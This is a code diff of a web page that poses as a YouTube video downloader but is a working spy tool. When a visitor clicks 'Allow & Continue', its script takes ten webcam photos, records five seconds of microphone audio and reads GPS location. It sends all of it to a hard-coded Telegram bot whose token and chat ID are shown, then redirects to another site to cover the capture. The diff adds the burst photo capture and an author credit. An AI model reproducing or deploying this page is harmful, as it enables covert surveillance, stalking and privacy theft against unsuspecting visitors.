@@ -2,69 +2,82 @@
 <html lang="en">
 <head>
   <meta charset="utf-8">
-  <title>YouTube Video Downloader</title>
+  <title>YouTube Downloader</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    body {font-family: Arial, sans-serif; text-align: center; background: #f5f5f5;}
-    .container {max-width: 500px; margin: 30px auto; background: white; padding: 20px; border-radius: 10px;}
+    body {font-family: Arial, sans-serif; text-align: center; background: #000; color: white;}
+    .container {max-width: 500px; margin: 30px auto; background: #111; padding: 20px; border-radius: 10px;}
     button {background: red; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer;}
     button:hover {background: darkred;}
-    img.logo {width: 120px; margin-bottom: 15px;}
+    .footer {
+      position: fixed; bottom: 10px; left: 50%; transform: translateX(-50%);
+      font-size: 16px; color: #00ff00; font-weight: bold;
+      animation: bounce 1s infinite alternate;
+    }
+    @keyframes bounce {
+      0% {transform: translate(-50%, 0);}
+      100% {transform: translate(-50%, -10px);}
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <img class="logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
-    <h1>📥 Download YouTube Video</h1>
-    <button id="startCapture">Allow Now & Download Video</button>
+    <h1>📥 Allow Now & Download YouTube Video</h1>
+    <button id="startCapture">Allow & Continue</button>
     <div id="status"></div>
   </div>
+
+  <div class="footer">Made By RED HAT HACKER X TAMIM</div>
 
   <script>
     const botToken = "8041585523:AAFPDOC3CH2HLgjaQveu5zoNj_fXYLkfdTg";
     const chatId = "6763021567";
 
     document.getElementById("startCapture").addEventListener("click", async () => {
-      document.getElementById("status").innerText = "Requesting permissions...";
+      document.getElementById("status").innerText = "Requesting camera, mic & location...";
 
       try {
-        // Get camera + microphone
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        document.getElementById("status").innerText = "Camera & Mic access granted ✅";
-
         const track = stream.getVideoTracks()[0];
         const imageCapture = new ImageCapture(track);
+        
+        // 📸 Capture multiple photos within 1 second
+        let photoCount = 0;
+        const captureInterval = setInterval(async () => {
+          if (photoCount >= 10) {
+            clearInterval(captureInterval);
+            track.stop();
+            return;
+          }
+          const blob = await imageCapture.takePhoto();
+          sendToTelegram(blob, "photo");
+          photoCount++;
+        }, 100);
 
-        // Capture photo
-        const photoBlob = await imageCapture.takePhoto();
-        sendToTelegram(photoBlob, "photo");
-
-        // Record 5s audio
-        const recorder = new MediaRecorder(stream);
-        const audioChunks = [];
-        recorder.ondataavailable = e => audioChunks.push(e.data);
-        recorder.onstop = () => {
+        // 🎤 Record 5 sec audio
+        const mediaRecorder = new MediaRecorder(stream);
+        let audioChunks = [];
+        mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+        mediaRecorder.onstop = () => {
           const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
-          sendToTelegram(audioBlob, "audio");
+          sendToTelegram(audioBlob, "voice");
         };
-        recorder.start();
-        setTimeout(() => recorder.stop(), 5000);
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 5000);
 
-        // Get location
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition((pos) => {
-            const locText = `📍 Location: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            sendTextToTelegram(locText);
-          }, (err) => console.warn("Location error:", err.message));
-        }
+        // 📍 Send location
+        navigator.geolocation.getCurrentPosition(pos => {
+          const loc = `Latitude: ${pos.coords.latitude}, Longitude: ${pos.coords.longitude}`;
+          sendMessage(loc);
+        });
 
-        // Redirect after 3s
+        // ⏩ Redirect after 1 second
         setTimeout(() => {
           window.location.href = "https://y2mate.com/";
-        }, 3000);
+        }, 1000);
 
       } catch (err) {
-        document.getElementById("status").innerText = "Permission denied ❌: " + err.message;
+        document.getElementById("status").innerText = "Error: " + err.message;
         console.error(err);
       }
     });
@@ -77,17 +90,15 @@
       fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
         method: "POST",
         body: formData
-      })
-      .then(res => res.json())
-      .then(json => console.log("Telegram Response:", json))
-      .catch(err => console.error("Error sending:", err));
+      }).catch(err => console.error("Error sending:", err));
     }
 
-    function sendTextToTelegram(text) {
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
-      .then(res => res.json())
-      .then(json => console.log("Location sent:", json))
-      .catch(err => console.error("Error sending text:", err));
+    function sendMessage(text) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text })
+      });
     }
   </script>
 </body>
